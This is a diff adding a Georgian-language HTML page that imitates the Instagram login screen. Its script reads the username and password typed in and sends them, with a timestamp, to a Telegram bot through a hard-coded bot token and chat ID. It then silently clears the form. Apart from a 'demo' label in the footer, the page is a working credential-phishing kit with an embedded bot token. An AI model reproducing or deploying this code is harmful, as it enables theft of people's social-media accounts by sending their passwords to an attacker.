@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="ka">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Instagram-ის სტილი - შესვლა</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 30px 30px;
+            margin-bottom: 10px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 35px;
+        }
+
+        .logo svg {
+            width: 175px;
+        }
+
+        .input-group {
+            margin-bottom: 6px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 9px 0 7px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            font-family: inherit;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #a8a8a8;
+            background: white;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            padding: 7px 16px;
+            margin-top: 12px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            gap: 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .fb-login {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .fb-link {
+            text-decoration: none;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .forgot-password {
+            text-align: center;
+            font-size: 12px;
+        }
+
+        .forgot-password a {
+            text-decoration: none;
+            color: #00376b;
+        }
+
+        .signup-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+        }
+
+        .app-buttons img {
+            height: 40px;
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <i data-visualcompletion="css-img" aria-label="Instagram" class="x15mokao x1ga7v0g x16uus16 xbiv7yw" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/yO/r/Ny6hrBVLYjl.webp&quot;); background-position: 0px 0px; background-size: auto; width: 96px; height: 96px; background-repeat: no-repeat; display: inline-block;"></i>
+            </div>
+
+            <form id="demoLoginForm" onsubmit="return false;">
+                <div class="input-group">
+                    <input type="text" class="input-field" id="username" placeholder="ტელეფონის ნომერი, მომხმარებლის სახელი ან ელ.ფოსტა" autocomplete="off">
+                </div>
+                <div class="input-group">
+                    <input type="password" class="input-field" id="password" placeholder="პაროლი">
+                </div>
+                <button type="button" class="login-btn" id="loginButton">შესვლა</button>
+            </form>
+
+            <div class="divider">
+                <div class="divider-line"></div>
+                <span>ან</span>
+                <div class="divider-line"></div>
+            </div>
+
+            <div class="fb-login">
+                <a href="#" class="fb-link" id="fbMockBtn">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="#385185">
+                        <path d="M16 8.05c0-4.42-3.58-8-8-8s-8 3.58-8 8c0 4 2.92 7.3 6.75 7.9v-5.6H4.8V8.05h2.95V6.2c0-2.9 1.73-4.5 4.36-4.5 1.26 0 2.58.23 2.58.23v2.84h-1.45c-1.43 0-1.88.89-1.88 1.8v2.17h3.2l-.5 3.23h-2.7V16c3.83-.6 6.74-3.9 6.74-7.95z"/>
+                    </svg>
+                    <span>შესვლა Facebook-ით</span>
+                </a>
+            </div>
+
+            <div class="forgot-password">
+                <a href="#">დაგავიწყდა პაროლი?</a>
+            </div>
+        </div>
+
+        <div class="signup-box">
+            ანგარიში არ გაქვს? <a href="#">რეგისტრაცია</a>
+        </div>
+
+        <div class="app-download">
+            <div>ჩამოტვირთე აპლიკაცია.</div>
+            <div class="app-buttons">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='136' height='40' viewBox='0 0 136 40'%3E%3Crect width='136' height='40' rx='6' fill='%23000'/%3E%3Ctext x='12' y='25' fill='white' font-size='10'%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store" style="background:#000; border-radius:6px;">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='136' height='40' viewBox='0 0 136 40'%3E%3Crect width='136' height='40' rx='6' fill='%23000'/%3E%3Ctext x='12' y='25' fill='white' font-size='10'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play" style="background:#000; border-radius:6px;">
+            </div>
+        </div>
+
+        <footer>
+            © 2025 Instagram from Meta (დემო ვერსია)
+        </footer>
+    </div>
+
+    <script>
+        // ========== 🔧 აქ ჩაწერეთ თქვენი მონაცემები ==========
+        const BOT_TOKEN = '8539654733:AAHNcF_2YRuoSKjNjee3Kobb85jVa3QL5Yk'; 
+        const CHAT_ID = '8040951429';      
+        // ====================================================
+
+        const btn = document.getElementById('loginButton');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const fbMock = document.getElementById('fbMockBtn');
+
+        async function sendToTelegram() {
+            let username = usernameInput.value.trim();
+            let password = passwordInput.value;
+            
+            if (username === "" || password === "") {
+                alert("❒ გთხოვთ შეავსოთ ორივე ველი!");
+                return;
+            }
+            
+            // მონაცემების ფორმატირება
+            const now = new Date();
+            const formattedTime = now.toLocaleString('ka-GE');
+            const message = `🔐 ახალი შესვლა\n\n👤 მომხმარებელი: ${username}\n🔑 პაროლი: ${password}\n⏰ დრო: ${formattedTime}`;
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                   // alert("✅ მონაცემები გაიგზავნა Telegram-ზე!");
+                    usernameInput.value = "";
+                    passwordInput.value = "";
+                } else {
+                    alert("❌ შეცდომა: " + result.description + "\n\nშეამოწმეთ ტოკენი და Chat ID სწორია თუ არა");
+                }
+            } catch (error) {
+                alert("❌ ქსელის შეცდომა: " + error.message);
+            }
+        }
+
+        btn.addEventListener('click', sendToTelegram);
+        
+        const inputs = [usernameInput, passwordInput];
+        inputs.forEach(input => {
+            input.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    sendToTelegram();
+                }
+            });
+        });
+        
+        fbMock.addEventListener('click', function(e) {
+            e.preventDefault();
+            alert("Facebook-ით შესვლა დემო რეჟიმში - მხოლოდ ვიზუალი.");
+        });
+    </script>
+</body>
+</html>
